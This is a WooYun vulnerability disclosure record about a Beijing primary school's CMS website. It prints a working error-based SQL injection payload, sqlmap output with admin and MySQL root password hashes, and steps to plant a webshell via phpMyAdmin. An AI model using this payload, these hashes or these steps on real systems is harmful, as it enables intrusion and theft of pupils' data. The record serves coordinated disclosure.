{"id": 58682, "wybug_id": "wooyun-2014-050250", "wybug_title": "某几个小学各种漏洞大礼包(疑似北京乐知行软件有限公司某cms)服务器shell 信息侧漏", "wybug_corp": "hdsyxx.net", "wybug_author": "Haswell", "wybug_date": "2014-02-04 10:49", "wybug_open_date": "2014-03-21 10:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "数字类型注射", "数据库账户权限过高", "字符类型注射", "管理后台对外", "后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-21：\t细节向公众公开  简要描述： 学生狗关注wooyun好久，来拿个验证码，由于太弱太明显就在这里不多说了。。。。。。。。据说母校官网找人开发改版了，来转悠转悠~~~~~~~~~~~~~~~~~~~--by Haswell 详细说明：  先是http://hdsyxx.net:85/phpinfo.php  PHP 5.3.x < 5.3.13 各种信息的好去处然后/admin, /includes, /icons,/session, /templates, /phpmyadmin, /eWebEditor, /includes /icons,/session, /templates,/eWebEditor,  神马文件枚举就不说了先看看/session\n\n\n\n。。。我姑且先认为这是个失误。然后hash拿到cmd5解密。。特莫第一次见管理员一位数密码。。。。再来看后台/admin登进去看到功能不多，貌似自己写的？\n\n觉得这样不太光荣，回去重来。。/ewebeditor 用户名密码admin还没注册。。没钱帮你们注册拿shell也没细看再回去重来/search.php 直接吓尿\n\n扔到sqlmap里，xx_user表里后台用户Database: dmc20121030Table: xx_user[3 entries]+---------+----------------------------------+-----------+------------+------------+------------+-------------+| user_id | user_pass                        | user_name | user_type2 | user_type1 | user_email | user_email2 |+---------+----------------------------------+-----------+------------+------------+------------+-------------+| 1       | c4ca4238a0b923820dcc509a6f75849b | 居福        | 0          | 1          | 1          | <blank>     || 2       | a87ff679a2f3e71d9181a67b7542122c | 海淀实验小学    | 0          | 0          | 4          | <blank>     || 4       | f4e5947fc68554c78a536a7a44e0eb22 | 海淀实验小学    | 0          | 0          | cheng      | <blank>     |+---------+----------------------------------+-----------+------------+------------+------------+-------------+因为有phpmyadmin,懒得跑了，直接--passwordsPlace: POSTParameter: user_email    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: action=login&user_email=a' AND (SELECT 9404 FROM(SELECT COUNT(*),CONCAT(0x7173666b71,(SELECT (CASE WHEN (9404=9404) THEN 1 ELSE 0 END)),0x716d736671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'ABpM'='ABpM&user_pass=a&x=76&y=10---web server operating system: Linux CentOS 6.3web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0database management system users password hashes:[*] root [3]:    password hash: *2F82CB134B90797738744908CBAE6D08313C4686    password hash: *64705BDB659CD527A15F85992DCE56AD472B6F01    password hash: NULL得到MySQL用户名密码然后cmd5解密不谢登陆phpmyadmin\n\n导出一句话拿shell\n\n/etc/passwd就好了/admin还有一条路：直接\n\n然后\n\n再次吓尿居然还有。。。。\n\n对了找敏感路径还有一条路/robots.txtContents of robots.txt :User-agent: *Disallow: /admin/Disallow: /eWebEditor/Disallow: /images/Disallow: /includes/Disallow: /smtp/Disallow: /templates/Disallow: /templates_c/Disallow: /uploadfile/Disallow: /uploadimage/Disallow: /css.cssDisallow: /style.cssxss很多，比如这里\n\n\n\n已经有人来过了\n\n\n\n这里当然也行。。。。\n\n\n\n这些地方还多多少少附带注入。。。。。。反射型一抓一大把不说了因为有同服务器乐知行数字校园，大量祖国花朵信息外泄同服务器的9998端口/cms今典小学官网www.bjhdjdxx.com/。。。为什么。。。。。母校你种魔了。。。。。。。。   漏洞证明：  Database: dmc20121030Table: xx_user[3 entries]+---------+----------------------------------+-----------+------------+------------+------------+-------------+| user_id | user_pass                        | user_name | user_type2 | user_type1 | user_email | user_email2 |+---------+----------------------------------+-----------+------------+------------+------------+-------------+| 1       | c4ca4238a0b923820dcc509a6f75849b | 居福        | 0          | 1          | 1          | <blank>     || 2       | a87ff679a2f3e71d9181a67b7542122c | 海淀实验小学    | 0          | 0          | 4          | <blank>     || 4       | f4e5947fc68554c78a536a7a44e0eb22 | 海淀实验小学    | 0          | 0          | cheng      | <blank>     |+---------+----------------------------------+-----------+------------+------------+------------+-------------+Place: POSTParameter: user_email    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: action=login&user_email=a' AND (SELECT 9404 FROM(SELECT COUNT(*),CONCAT(0x7173666b71,(SELECT (CASE WHEN (9404=9404) THEN 1 ELSE 0 END)),0x716d736671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'ABpM'='ABpM&user_pass=a&x=76&y=10---web server operating system: Linux CentOS 6.3web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0database management system users password hashes:[*] root [3]:    password hash: *2F82CB134B90797738744908CBAE6D08313C4686    password hash: *64705BDB659CD527A15F85992DCE56AD472B6F01password hash: NULL\n\n\n\n\n\n\n\n\n\n导出一句话木马\n\n菜刀连\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  过滤，该藏起来的藏起来，降权还有看看他咋写的\n\n话说在最底下看到 版权所有 设计维护：北京乐知行软件有限公司，不知道cms是不是乐知行写的。。。J几个小学在用不知道算不算通用型==（估计不是）**捉住那个码农让他回来上咱小学的计算机课。还有求下次回学校看老师不被保安驱逐。//第一次wooyun好激动。。。。。。。==   版权声明：转载请注明来源 Haswell@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-02-09 09:32 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-16 10:26 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  写的灰常有意思    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}